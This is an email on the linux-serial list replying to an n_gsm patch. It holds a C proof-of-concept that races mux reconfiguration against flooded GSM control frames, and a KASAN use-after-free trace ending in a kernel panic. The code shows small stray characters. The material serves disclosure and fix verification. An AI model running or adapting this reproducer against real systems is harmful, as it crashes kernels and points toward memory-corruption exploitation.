Received: from mail-pf1-f170.google.com (mail-pf1-f170.google.com [209.85.210.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AC55B38837C
	for <linux-serial@vger.kernel.org>; Fri, 12 Jun 2026 14:22:34 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781274156; cv=none; b=tZ369Zzgcjx8ncnIzjuCTzXMjCeLZlOQxxH+GykJ/KtUP0cN39+oLOIA9vSF1NfHNnH4/m0QiboZmKnyPlg5fZxMQSlUDxvFr81cHiwefXZJxKiqMq78OkNXdXdt4OZgGqbrQ4oSgLHDhJPOEk25OgNblmWM05KWBsJNix5V6LI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781274156; c=relaxed/simple;
	bh=4A847NmHrLvM3OyWbV2i91jWvTx2H8ggj9YpwwoyhQg=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=iSxcEm06/vtX113pYLI9QvJNWD5RwTWCJnTFT/AMUM6tVuLPFhMVQMbJfUomw2QccwVq6L1YN1eevLw3Ps+CHa/X4eLuhRDbSuZyzXcq0lNPTgtKGyx25oSbZEho6g99pQPKG8v/skLsHDS8dyQUVHpGA4+u0T9IqV048kDubg0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=J1K/hB9+; arc=none smtp.client-ip=209.85.210.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="J1K/hB9+"
Received: by mail-pf1-f170.google.com with SMTP id d2e1a72fcca58-84275887a3fso1486771b3a.1
        for <linux-serial@vger.kernel.org>; Fri, 12 Jun 2026 07:22:34 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1781274154; x=1781878954; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=wVaUPjEA2br7mOZuMQebY+byHuIfouEqaIZko0i51VQ=;
        b=J1K/hB9+ieLz1H+mEIMrxb33DIkgDT2guqovwT06RPy+6wrScg+JvbuynxhzcvFBur
         GeaiXuSzyvbkr/+bBr5Uv7okUBIfkQOBRU0qAukrZkadzQX/Tpmc09j2bYe+pofPBd30
         svWVnE480cGUAInd4FDocB9BbJDN6dmXZk/iYdApl5gZWcF+Lt4AOsSvK2g4bNgfWBD8
         iTuJlyWhMNXvKKfnRPnJlCYM0P+64ndWQbNczCPZfW0uTw65fr+trGzuB3JZflsBSxHq
         cKStzZmlq/JcaoESGZGrMg8Gz68swtJgEVcGEYRfvL/dSWPYC8w7eBl3OS1InDAXOBCs
         akqQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781274154; x=1781878954;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=wVaUPjEA2br7mOZuMQebY+byHuIfouEqaIZko0i51VQ=;
        b=BDSvDhRUIx0AwbONt4/JlPD4/a43dUjFlVmecuFq1z5SqpNHgYQc7sWgpAX0s+gs6P
         W6ZB8RB9CSwjp3GwHRunpOOG0j+RrEactZigO0VqqwVxt/NdJ2ge5qKkh6VyC8EyIPGE
         7ZBbv/anr1G12cFSu9LR5ilJQm+5NKmba05J9MZbCGKPHM01mkFOU+sMZi1Q3e+goPpp
         EhUB7Op09A7FxRiyr2zvbYp0prUX7s/LhiiNZ+fsWhdCIKIaSu3EYYY/PVWY02CVvYnv
         LxEomJw/oHxi0DlOOywYqFBsuVD4jgUbH7uxFMpttGqZMTfT+/VF15hVCJcN4Fo6u0sa
         ms1A==
X-Forwarded-Encrypted: i=1; AFNElJ+dyCOh3yeepr5iF0+wzC/ehoq60R6/Hfb20p7MaJx3nQYnmjhNjaC/FHzJTabIp+W9w5c0zUDscQHnGwI=@vger.kernel.org
X-Gm-Message-State: AOJu0YxfyGC+ALHLY1pOgnPCZQKsivo3IQji5OPtk29n5OtA7u7OwaaY
	rBf+rh5m/Tebc0/s9hoHkrE0VaYdFVunyP2eAd5CsAeWogyBih8Co3nk
X-Gm-Gg: Acq92OEA+80Nnc1hxHT+Ag7sGZNaq9TwbkfIu3fSaTVB6j77viVEio5bCfQkYZq8Z6e
	Fu0qq+6+NZYfjUqT4dKGHX5vGf/E1ZgXGlQfxxoZckFT+dXG54S/EuB+iSvo1XSxWRp9/sj3Abd
	rcgKVw38bxxGxedb5Q0A1HxjkQvW7supFjv4IiHWXrJrmAnZbfbnp9ItJ4J6GU51hu5EgrWfaMn
	Os2CsNDZBFApffPwt6UC3ATu8BWpXriKtUX6znRSejm3umH6Ep40j1a+1lC47TX596/NadUOisc
	C2tAU2/MxO1p9pLxRMNSQZoJ6QUcA90cUDjHMVCRMsLtnG9PtrrAwmnURO3iYWftIyEMJLw8jaP
	k0h0KeHWcGeG+HZZkJYGqxCGJu/8UcwD/wToWXfxFZqCjQCnjYqN9RBKxMTf+jWBfTXh5GKMIUc
	SFNMrj/IhN7nK2f47KumF1QXDrZ0CAXFE4WR5nDTpMsycKwmJ9FDo=
X-Received: by 2002:a05:6a00:2d95:b0:842:446a:4cb5 with SMTP id d2e1a72fcca58-84349376e5bmr3014291b3a.0.1781274153901;
        Fri, 12 Jun 2026 07:22:33 -0700 (PDT)
Received: from Air.local ([198.176.50.157])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8434b00d4f5sm2392199b3a.43.2026.06.12.07.22.30
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 12 Jun 2026 07:22:33 -0700 (PDT)
Date: Fri, 12 Jun 2026 22:22:27 +0800
From: Weiming Shi <bestswngs@gmail.com>
To: Greg Kroah-Hartman <gregkh@linuxfoundation.org>, 
	Jiri Slaby <jirislaby@kernel.org>
Cc: Daniel Starke <daniel.starke@siemens.com>, 
	linux-kernel@vger.kernel.org, linux-serial@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
Subject: Re: [PATCH] tty: n_gsm: fix NULL deref of gsm->dlci[0] in control
 message handlers
Message-ID: <aiwTzqgqwhm-4w8J@Air.local>
References: <20260611183217.2488508-2-bestswngs@gmail.com>
Precedence: bulk
X-Mailing-List: linux-serial@vger.kernel.org
List-Id: <linux-serial.vger.kernel.org>
List-Subscribe: <mailto:linux-serial+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-serial+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260611183217.2488508-2-bestswngs@gmail.com>

here is the reproducer and the kernel config 

Setup:

required configs:

```
CONFIG_N_GSM=y
CONFIG_SMP=y
CONFIG_PREEMPT=y
CONFIG_KASAN=y
```

Reproducer:

build: gcc poc.c -o poc -lpthread -static

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/tty.h>
#include <linux/gsmmux.h>

#ifndef N_GSM0710
#define N_GSM0710 21
#endif

#define GSM0_SOF   0xF9
#define ADDR_DLCI0 0x03
#define PF         0x10
#define CTRL_SABM  (0x2F | PF)
#define CTRL_UIH   0xEF
#define INIT_FCS   0xFF
#define CMD_TEST_EA 0x23

static const unsigned char gsm_fcs8[256] = {
0x00,0x91,0xE3,0x72,0x07,0x96,0xE4,0x75,0x0E,0x9F,0xED,0x7C,0x09,0x98,0xEA,0x7B,
0x1C,0x8D,0xFF,0x6E,0x1B,0x8A,0xF8,0x69,0x12,0x83,0xF1,0x60,0x15,0x84,0xF6,0x67,
0x38,0xA9,0xDB,0x4A,0x3F,0xAE,0xDC,0x4D,0x36,0xA7,0xD5,0x44,0x31,0xA0,0xD2,0x43,
0x24,0xB5,0xC7,0x56,0x23,0xB2,0xC0,0x51,0x2A,0xBB,0xC9,0x58,0x2D,0xBC,0xCE,0x5F,
0x70,0xE1,0x93,0x02,0x77,0xE6,0x94,0x05,0x7E,0xEF,0x9D,0x0C,0x79,0xE8,0x9A,0x0B,
0x6C,0xFD,0x8F,0x1E,0x6B,0xFA,0x88,0x19,0x62,0xF3,0x81,0x10,0x65,0xF4,0x86,0x17,
0x48,0xD9,0xAB,0x3A,0x4F,0xDE,0xAC,0x3D,0x46,0xD7,0xA5,0x34,0x41,0xD0,0xA2,0x33,
0x54,0xC5,0xB7,0x26,0x53,0xC2,0xB0,0x21,0x5A,0xCB,0xB9,0x28,0x5D,0xCC,0xBE,0x2F,
0xE0,0x71,0x03,0x92,0xE7,0x76,0x04,0x95,0xEE,0x7F,0x0D,0x9C,0xE9,0x78,0x0A,0x9B,
0xFC,0x6D,0x1F,0x8E,0xFB,0x6A,0x18,0x89,0xF2,0x63,0x11,0x80,0xF5,0x64,0x16,0x87,
0xD8,0x49,0x3B,0xAA,0xDF,0x4E,0x3C,0xAD,0xD6,0x47,0x35,0xA4,0xD1,0x40,0x32,0xA3,
0xC4,0x55,0x27,0xB6,0xC3,0x52,0x20,0xB1,0xCA,0x5B,0x29,0xB8,0xCD,0x5C,0x2E,0xBF,
0x90,0x01,0x73,0xE2,0x97,0x06,0x74,0xE5,0x9E,0x0F,0x7D,0xEC,0x99,0x08,0x7A,0xEB,
0x8C,0x1D,0x6F,0xFE,0x8B,0x1A,0x68,0xF9,0x82,0x13,0x61,0xF0,0x85,0x14,0x66,0xF7,
0xA8,0x39,0x4B,0xDA,0xAF,0x3E,0x4C,0xDD,0xA6,0x37,0x45,0xD4,0xA1,0x30,0x42,0xD3,
0xB4,0x25,0x57,0xC6,0xB3,0x22,0x50,0xC1,0xBA,0x2B,0x59,0xC8,0xBD,0x2C,0x5E,0xCF
};

static unsigned char fcs_header(const unsigned char *p, int n){
    unsigned char fcs = INIT_FCS;
    for (int i=0;i<n;i++) fcs = gsm_fcs8[fcs ^ p[i]];
    return 0xFF - fcs;
}
static int build_frame(unsigned char *out, unsigned char addr, unsigned char ctrl,
                       const unsigned char *data, int dlen){
    unsigned char hdr[3]={addr,ctrl,(unsigned char)((dlen<<1)|1)};
    int i=0; out[i++]=GSM0_SOF; out[i++]=addr; out[i++]=ctrl;
    out[i++]=(unsigned char)((dlen<<1)|1);
    for(int j=0;j<dlen;j++) out[i++]=data[j];
    out[i++]=fcs_header(hdr,3); out[i++]=GSM0_SOF; return i;
}

static int gsm_fd, wire_fd;
static volatile int stop;
static int ncpu;

static unsigned char sabm_frame[16]; static int sabm_len;
static unsigned char test_frame[64]; static int test_len;
#define BATCH 64
static unsigned char batch_buf[BATCH*64]; static int batch_len;
static unsigned char reopen_buf[16 + 16*64]; static int reopen_len;

static void pin_cpu(int cpu){ cpu_set_t s; CPU_ZERO(&s); CPU_SET(cpu,&s); sched_setaffinity(0,sizeof(s),&s);}
static void nop_handler(int s){(void)s;}

static void *drain_thread(void *a){(void)a; unsigned char b[4096];
    while(!stop){ ssize_t n=read(wire_fd,b,sizeof(b)); if(n<=0) sched_yield(); } return NULL;}

static void *exprace_thread(void *a){(void)a; pin_cpu(1);
    setpriority(PRIO_PROCESS,0,-20); signal(SIGALRM,nop_handler);
    struct itimerval t={{0,25},{0,25}}; setitimer(ITIMER_REAL,&t,NULL);
    while(!stop) pause(); return NULL;}

static void *hog_thread(void *a){ long id=(long)a; int cpus[3]={0,2,3}; pin_cpu(cpus[id%3] < ncpu ? cpus[id%3] : 0);
    volatile unsigned long x=0; while(!stop){ for(int i=0;i<100000;i++) x+=i; (void)x; } return NULL;}

static void setconf(int fd,int mtu){
    struct gsm_config c; memset(&c,0,sizeof(c));
    c.adaption=1; c.encapsulation=0; c.initiator=0;
    c.mru=64; c.mtu=mtu; c.i=1; c.k=2; c.t1=1; c.t2=1; c.n2=1;
    ioctl(fd,GSMIOC_SETCONF,&c);
}

static volatile unsigned long teardowns;
static int mtu_toggle;
static v


        oid *teardown_thread(void *a){(void)a; pin_cpu(1);
    while(!stop){
        setconf(gsm_fd,(mtu_toggle++&1)?64:127);
        if(write(wire_fd,reopen_buf,reopen_len)<0){}
        teardowns++;
    }
G    return NULL;
}

int main(void){
    int ldisc=N_GSM0710; pthread_t tt,ir,dr; char sname[128]; struct termios tio;
    setvbuf(stdout,NULL,_IONBF,0);
    ncpu = sysconf(_SC_NPROCESSORS_ONLN); if(ncpu<2) ncpu=2;
    pin_cpu(0);
    mkdir("/dev/pts",0755); mount("devpts","/dev/pts","devpts",0,"");
    mount("devpts","/dev/pts","devpts",MS_REMOUNT,"");
    wire_fd=open("/dev/ptmx",O_RDWR|O_NOCTTY); if(wire_fd<0){perror("ptmx");return 1;}
    grantpt(wire_fd); unlockpt(wire_fd);
    if(ptsname_r(wire_fd,sname,sizeof(sname))){perror("ptsname");return 1;}
    gsm_fd=open(sname,O_RDWR|O_NOCTTY); if(gsm_fd<0){perror("open slave");return 1;}
    if(tcgetattr(wire_fd,&tio)==0){cfmakeraw(&tio); tcsetattr(wire_fd,TCSANOW,&tio);}
    if(ioctl(gsm_fd,TIOCSETD,&ldisc)<0){perror("TIOCSETD");return 1;}
    printf("[+] n_gsm ldisc installed; ncpu=%d\n",ncpu);
    setconf(gsm_fd,64);
    printf("[+] mux configured (responder)\n");

    sabm_len=build_frame(sabm_frame,ADDR_DLCI0,CTRL_SABM,NULL,0);
    unsigned char tp[16]; tp[0]=CMD_TEST_EA; tp[1]=(8<<1)|1;
    for(int i=0;i<8;i++) tp[2+i]=0x41+i;
    test_len=build_frame(test_frame,ADDR_DLCI0,CTRL_UIH,tp,2+8);
    batch_len=0; for(int i=0;i<BATCH;i++){memcpy(batch_buf+batch_len,test_frame,test_len); batch_len+=test_len;}
    reopen_len=0; memcpy(reopen_buf,sabm_frame,sabm_len); reopen_len+=sabm_len;
    for(int i=0;i<16;i++){memcpy(reopen_buf+reopen_len,test_frame,test_len); reopen_len+=test_len;}

    if(write(wire_fd,sabm_frame,sabm_len)<0){}

    pthread_create(&dr,NULL,drain_thread,NULL);
    pthread_create(&ir,NULL,exprace_thread,NULL);
    pthread_create(&tt,NULL,teardown_thread,NULL);
    int nh = (ncpu>=4)?3:1; pthread_t *hogs = calloc(nh,sizeof(pthread_t));
    for(long i=0;i<nh;i++) pthread_create(&hogs[i],NULL,hog_thread,(void*)i);

    unsigned long w=0;
    while(!stop && w<5000000000UL){
        if(write(wire_fd,batch_buf,batch_len)<0){}
        if((++w%200000)==0) printf("[r] flood=%lu teardowns=%lu\n",w,teardowns);
    }
    stop=1;
    pthread_join(tt,NULL); pthread_join(ir,NULL); pthread_join(dr,NULL);
    for(long i=0;i<nh;i++) pthread_join(hogs[i],NULL);
    printf("[-] poc finished (flood=%lu teardowns=%lu)\n",w,teardowns);
    return 0;
}
```

After a long process of competition, will see such KASAN logs.

```
root@repro:~# /tmp/exp/exploit
[+] n_gsm ldisc installed; ncpu=4
[+] mux configured (responder)
[r] flood=200000 teardowns=346
[   92.074763][ T1263] cfg80211: failed to load regulatory.db
[r] flood=400000 teardowns=702
[r] flood=600000 teardowns=1100
[r] flood=800000 teardowns=1470
[r] flood=1000000 teardowns=1855
[r] flood=1200000 teardowns=2236
[r] flood=1400000 teardowns=2625
[r] flood=1600000 teardowns=3017
[r] flood=1800000 teardowns=3404
[r] flood=2000000 teardowns=3798
[r] flood=2200000 teardowns=4183
[r] flood=2400000 teardowns=4559
[r] flood=2600000 teardowns=4937
[r] flood=2800000 teardowns=5306
[r] flood=3000000 teardowns=5691
[r] flood=3200000 teardowns=6044
[r] flood=3400000 teardowns=6394
[r] flood=3600000 teardowns=6757
[r] flood=3800000 teardowns=7100
[r] flood=4000000 teardowns=7460
[r] flood=4200000 teardowns=7823
[r] flood=4400000 teardowns=8187
[r] flood=4600000 teardowns=8561
[r] flood=4800000 teardowns=8921
[r] flood=5000000 teardowns=9283
[r] flood=5200000 teardowns=9689
[r] flood=5400000 teardowns=10069
[r] flood=5600000 teardowns=10433
[  997.225852][   T46] ==================================================================
[  997.227486][   T46] BUG: KASAN: slab-use-after-free in gsm_control_reply.isra.0+0x1b6/0x1d0
[  997.229052][   T46] Read of size 8 at addr ffff888029ae9000 by task kworker/u16:2/46
[  997.230517][   T46]
[  997.230952][   T46] CPU: 1 UID: 0 PID: 46 Comm: kworker/u16:2 Not tainted 7.1.0-rc7 #1 PREEMPT(full)
[  997.230958][   T46] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-4
[  997.230961][   T46] Workqueue: events_unbound flush_to_ldisc
[  997.230969][   T46] Call Trace:
[  997.230972][   T46]  <TASK>
[  997.230974][   T46]  dump_stack_lvl+0x78/0xe0
[  997.230990][   T46]  print_report+0xf7/0x600
[  997.230996][   T46]  ? gsm_control_reply.isra.0+0x1b6/0x1d0
[  997.230999][   T46]  ? __virt_addr_valid+0x22c/0x420
[  997.231005][   T46]  ? gsm_control_reply.isra.0+0x1b6/0x1d0
[  997.231008][   T46]  kasan_report+0xe4/0x120
[  997.231012][   T46]  ? gsm_control_reply.isra.0+0x1b6/0x1d0
[  997.231016][   T46]  gsm_control_reply.isra.0+0x1b6/0x1d0
[  997.231020][   T46]  gsm_dlci_command+0x8ab/0x16f0
[  997.231024][   T46]  ? __pfx_gsm_dlci_command+0x10/0x10
[  997.231028][   T46]  ? tty_buffer_free+0x100/0x200
[  997.231032][   T46]  ? gsm_queue+0x1f4/0x750
[  997.231036][   T46]  gsmld_receive_buf+0x170/0x270
[  997.231040][   T46]  ? tty_buffer_free+0x1ae/0x200
[  997.231044][   T46]  tty_ldisc_receive_buf+0xfd/0x1d0
[  997.231048][   T46]  ? tty_ldisc_ref+0x19/0x70
[  997.231052][   T46]  tty_port_default_receive_buf+0x5e/0x90
[  997.231056][   T46]  flush_to_ldisc+0x1dc/0x7a0
[  997.231061][   T46]  ? rcu_is_watching+0x12/0xc0
[  997.231066][   T46]  process_one_work+0x8fb/0x1c20
[  997.231073][   T46]  ? __pfx_process_one_work+0x10/0x10
[  997.231078][   T46]  ? __pfx_flush_to_ldisc+0x10/0x10
[  997.231082][   T46]  worker_thread+0x528/0xeb0
[  997.231088][   T46]  ? __pfx_worker_thread+0x10/0x10
[  997.231091][   T46]  kthread+0x30d/0x400
[  997.231096][   T46]  ? _raw_spin_unlock_irq+0x23/0x50
[  997.231100][   T46]  ? __pfx_kthread+0x10/0x10
[  997.231103][   T46]  ret_from_fork+0x5fb/0xa10
[  997.231108][   T46]  ? __pfx_ret_from_fork+0x10/0x10
[  997.231112][   T46]  ? __switch_to+0x57f/0xe20
[  997.231117][   T46]  ? __pfx_kthread+0x10/0x10
[  997.231120][   T46]  ret_from_fork_asm+0x1a/0x30
[  997.231128][   T46]  </TASK>
[  997.231130][   T46]
[  997.267905][   T46] Allocated by task 5110:
[  997.268716][   T46]  kasan_save_stack+0x33/0x60
[  997.269595][   T46]  kasan_save_track+0x14/0x30
[  997.270483][   T46]  __kasan_kmalloc+0xaa/0xb0
[  997.271353][   T46]  gsm_dlci_alloc+0x45/0x780
[  997.272203][   T46]  gsm_activate_mux+0x12/0x220
[  997.273109][   T46]  gsmld_ioctl+0x92f/0x13d0
[  997.273981][   T46]  tty_ioctl+0x8f4/0x1250
[  997.274789][   T46]  __x64_sys_ioctl+0x134/0x1c0
[  997.275682][   T46]  do_syscall_64+0x116/0x7d0
[  997.276544][   T46]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  997.277658][   T46]
[  997.278108][   T46] Freed by task 5110:
[  997.278865][   T46]  kasan_save_stack+0x33/0x60
[  997.279740][   T46]  kasan_save_track+0x14/0x30
[  997.280615][   T46]  kasan_save_free_info+0x3b/0x60
[  997.281554][   T46]  __kasan_slab_free+0x5f/0x80
[  997.282435][   T46]  kfree+0x2e3/0x6c0
[  997.283159][   T46]  gsm_cleanup_mux+0x2b9/0x7a0
[  997.284050][   T46]  gsmld_ioctl+0x642/0x13d0
[  997.284928][   T46]  tty_ioctl+0x8f4/0x1250
[  997.285746][   T46]  __x64_sys_ioctl+0x134/0x1c0
[  997.286653][   T46]  do_syscall_64+0x116/0x7d0
[  997.287526][   T46]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  997.288639][   T46]
[  997.289071][   T46] The buggy address belongs to the object at ffff888029ae9000
[  997.289071][   T46]  which belongs to the cache kmalloc-2k of size 2048
[  997.291693][   T46] The buggy address is located 0 bytes inside of
[  997.291693][   T46]  freed 2048-byte region [ffff888029ae9000, ffff888029ae9800)
[  997.294229][   T46]
[  997.294696][   T46] The buggy address belongs to the physical page:
[  997.295885][   T46] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x29ae8
[  997.297505][   T46] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[  997.299083][   T46] flags: 0xfff00000000040(head|node=0|zone=1|lastcpupid=0x7ff)
[  997.300489][   T46] page_type: f5(slab)
[  997.301222][   T46] raw: 00fff00000000040 ffff888019c42f00 dead000000000100 dead000000000122
[  997.302818][   T46] raw: 0000000000000000 0000000800080008 00000000f5000000 0000000000000000
[  997.304404][   T46] head: 00fff00000000040 ffff888019c42f00 dead000000000100 dead000000000122
[  997.305999][   T46] head: 0000000000000000 0000000800080008 00000000f5000000 0000000000000000
[  997.307589][   T46] head: 00fff00000000003 fffffffffffffe01 00000000ffffffff 00000000ffffffff
[  997.309183][   T46] head: ffffffffffffffff 0000000000000000 00000000ffffffff 0000000000000008
[  997.310741][   T46] page dumped because: kasan: bad access detected
[  997.311895][   T46] page_owner tracks the page as allocated
[  997.312927][   T46] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP7
[  997.316667][   T46]  post_alloc_hook+0xfc/0x120
[  997.317525][   T46]  get_page_from_freelist+0x75b/0x3220
[  997.318514][   T46]  __alloc_frozen_pages_noprof+0x27e/0x2b00
[  997.319584][   T46]  new_slab+0xa6/0x670
[  997.320353][   T46]  refill_objects+0x278/0x420
[  997.321200][   T46]  __pcs_replace_empty_main+0x2ed/0x640
[  997.322198][   T46]  __kmalloc_cache_noprof+0x576/0x6e0
[  997.323176][   T46]  tty_register_device_attr+0x1e6/0x790
[  997.324185][   T46]  gsm_activate_mux+0x101/0x220
[  997.325064][   T46]  gsmld_ioctl+0x92f/0x13d0
[  997.325893][   T46]  tty_ioctl+0x8f4/0x1250
[  997.326674][   T46]  __x64_sys_ioctl+0x134/0x1c0
[  997.327569][   T46]  do_syscall_64+0x116/0x7d0
[  997.328411][   T46]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  997.329511][   T46] page last free pid 36 tgid 36 stack trace:
[  997.330590][   T46]  __free_frozen_pages+0x763/0xfc0
[  997.331513][   T46]  qlist_free_all+0x47/0xf0
[  997.332341][   T46]  kasan_quarantine_reduce+0x195/0x1e0
[  997.333329][   T46]  __kasan_slab_alloc+0x69/0x90
[  997.334218][   T46]  kmem_cache_alloc_lru_noprof+0x23f/0x6d0
[  997.335299][   T46]  __d_alloc+0x30/0x9e0
[  997.336062][   T46]  d_alloc+0x43/0x1d0
[  997.336802][   T46]  lookup_one_qstr_excl+0xf6/0x1d0
[  997.337736][   T46]  filename_create+0x195/0x360
[  997.338625][   T46]  start_creating_path+0x2f/0x50
[  997.339516][   T46]  devtmpfs_work_loop+0xea/0xbe0
[  997.340430][   T46]  devtmpfsd+0x2e/0x30
[  997.341168][   T46]  kthread+0x30d/0x400
[  997.341938][   T46]  ret_from_fork+0x5fb/0xa10
[  997.342773][   T46]  ret_from_fork_asm+0x1a/0x30
[  997.343641][   T46]
[  997.344094][   T46] Memory state around the buggy address:
[  997.345104][   T46]  ffff888029ae8f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  997.346571][   T46]  ffff888029ae8f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  997.348038][   T46] >ffff888029ae9000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  997.349516][   T46]                    ^
[  997.350248][   T46]  ffff888029ae9080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  997.351699][   T46]  ffff888029ae9100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  997.353151][   T46] ==================================================================
[  997.360386][   T46] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  997.361687][   T46] CPU: 1 UID: 0 PID: 46 Comm: kworker/u16:2 Not tainted 7.1.0-rc7 #1 PREEMPT(full)
[  997.363387][   T46] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-4
[  997.365572][   T46] Workqueue: events_unbound flush_to_ldisc
[  997.366642][   T46] Call Trace:
[  997.367253][   T46]  <TASK>
[  997.367794][   T46]  vpanic+0x6be/0x790
[  997.368519][   T46]  ? __pfx_vpanic+0x10/0x10
[  997.369344][   T46]  ? gsm_control_reply.isra.0+0x1b6/0x1d0
[  997.370382][   T46]  panic+0xc5/0xd0
[  997.371056][   T46]  ? __pfx_panic+0x10/0x10
[  997.371887][   T46]  ? preempt_schedule_common+0x42/0xc0
[  997.372877][   T46]  ? preempt_schedule_thunk+0x16/0x30
[  997.373855][   T46]  check_panic_on_warn+0x5c/0x80
[  997.374749][   T46]  end_report+0x13e/0x180
[  997.375567][   T46]  kasan_report+0xf4/0x120
[  997.376377][   T46]  ? gsm_control_reply.isra.0+0x1b6/0x1d0
[  997.377406][   T46]  gsm_control_reply.isra.0+0x1b6/0x1d0
[  997.378417][   T46]  gsm_dlci_command+0x8ab/0x16f0
[  997.379312][   T46]  ? __pfx_gsm_dlci_command+0x10/0x10
[  997.380279][   T46]  ? tty_buffer_free+0x100/0x200
[  997.381192][   T46]  ? gsm_queue+0x1f4/0x750
[  997.381997][   T46]  gsmld_receive_buf+0x170/0x270
[  997.382886][   T46]  ? tty_buffer_free+0x1ae/0x200
[  997.383791][   T46]  tty_ldisc_receive_buf+0xfd/0x1d0
[  997.384736][   T46]  ? tty_ldisc_ref+0x19/0x70
[  997.385594][   T46]  tty_port_default_receive_buf+0x5e/0x90
[  997.386645][   T46]  flush_to_ldisc+0x1dc/0x7a0
[  997.387505][   T46]  ? rcu_is_watching+0x12/0xc0
[  997.388447][   T46]  process_one_work+0x8fb/0x1c20
[  997.389348][   T46]  ? __pfx_process_one_work+0x10/0x10
[  997.390338][   T46]  ? __pfx_flush_to_ldisc+0x10/0x10
[  997.391278][   T46]  worker_thread+0x528/0xeb0
[  997.392108][   T46]  ? __pfx_worker_thread+0x10/0x10
[  997.393052][   T46]  kthread+0x30d/0x400
[  997.393808][   T46]  ? _raw_spin_unlock_irq+0x23/0x50
[  997.394750][   T46]  ? __pfx_kthread+0x10/0x10
[  997.395594][   T46]  ret_from_fork+0x5fb/0xa10
[  997.396442][   T46]  ? __pfx_ret_from_fork+0x10/0x10
[  997.397375][   T46]  ? __switch_to+0x57f/0xe20
[  997.398196][   T46]  ? __pfx_kthread+0x10/0x10
[  997.399033][   T46]  ret_from_fork_asm+0x1a/0x30
[  997.399906][   T46]  </TASK>
[  997.401199][   T46] Kernel Offset: disabled
[  997.401979][   T46] Rebooting in 86400 seconds..
```

